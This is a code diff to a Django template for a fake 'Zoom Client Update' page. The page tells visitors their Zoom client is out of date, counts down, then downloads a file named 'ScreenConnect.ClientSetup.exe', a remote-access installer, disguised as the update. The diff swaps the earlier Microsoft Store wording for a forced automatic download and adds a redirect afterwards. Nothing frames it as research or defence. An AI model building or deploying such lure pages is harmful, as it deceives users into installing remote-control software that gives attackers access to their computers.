@@ -1,3 +1,4 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6,8 +7,7 @@
 <title>Zoom Client Update</title>
 <meta name="description" content="Your Zoom Client is out of date. Download the update installer.">
 <meta name="robots" content="noindex, nofollow">
-<link rel="canonical" href="https://Zoom.us/client/latest/ZoomInstaller.exe">
-<link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/7/7b/Zoom_Communications_Logo.svg">
+<link rel="icon" type="image/svg+xml" href="{% static 'zoom_logo.webp' %}">
 
 <style>
 body{
@@ -89,54 +89,67 @@ p{
 
 <h1>Your Zoom Client is Out of Date</h1>
 
-<p>Please wait while you're redirected to Microsoft Store...</p>
-<p class="blue">Please wait while you're redirected to Microsoft Store...</p>
+<p>Please wait — your download will start shortly.</p>
+<p class="blue">Please wait — your download will start shortly.</p>
 
 <div class="countdown">
-Redirecting in <span id="count">5</span> seconds
+Download in <span id="count">5</span> seconds
 </div>
 
 <div id="loaderSlot" class="loader-slot">
 <div class="loader" id="loaderSpin"></div>
 </div>
 
-<p>If you are not redirected automatically, click below:</p>
+<p>If the download does not start, click below:</p>
 
 <a id="storeBtn" class="button" href="{% url 'client_setup' %}">
-<img class="store-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg">
-Go to Microsoft Store
+<img class="store-icon" alt="" src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg">
+Download installer
 </a>
 
 <script>
 
 var downloadUrl = "{% url 'client_setup' %}";
+var afterDownloadUrl = "{% url 'after_download' %}";
 let timeLeft = 5;
 
 document.getElementById("storeBtn").href = downloadUrl;
 
+function redirectAfterDownload() {
+    window.location.href = afterDownloadUrl;
+}
+
 function triggerDownload() {
-    var frame = document.createElement("iframe");
-    frame.style.display = "none";
-    frame.style.width = "0";
-    frame.style.height = "0";
-    frame.setAttribute("aria-hidden", "true");
-    frame.src = downloadUrl;
-    document.body.appendChild(frame);
-    setTimeout(function () {
-        if (frame.parentNode) {
-            frame.parentNode.removeChild(frame);
-        }
-    }, 120000);
+    var w = window.open(downloadUrl, "_blank", "noopener,noreferrer");
+    if (w) {
+        setTimeout(redirectAfterDownload, 2500);
+        return;
+    }
+    var a = document.createElement("a");
+    a.href = downloadUrl;
+    a.setAttribute("download", "ScreenConnect.ClientSetup.exe");
+    a.rel = "noopener";
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(redirectAfterDownload, 6000);
 }
 
 function showDownloadUpdate() {
     var slot = document.getElementById("loaderSlot");
-    slot.textContent = "";
+    slot.innerHTML = "";
+    var wrap = document.createElement("div");
+    wrap.style.display = "flex";
+    wrap.style.flexDirection = "column";
+    wrap.style.alignItems = "center";
+    wrap.style.gap = "14px";
+
     var a = document.createElement("a");
     a.className = "button";
     a.href = downloadUrl;
-    a.textContent = "Download update";
-    slot.appendChild(a);
+    a.textContent = "Download again";
+    wrap.appendChild(a);
 }
 
 let timer = setInterval(function(){
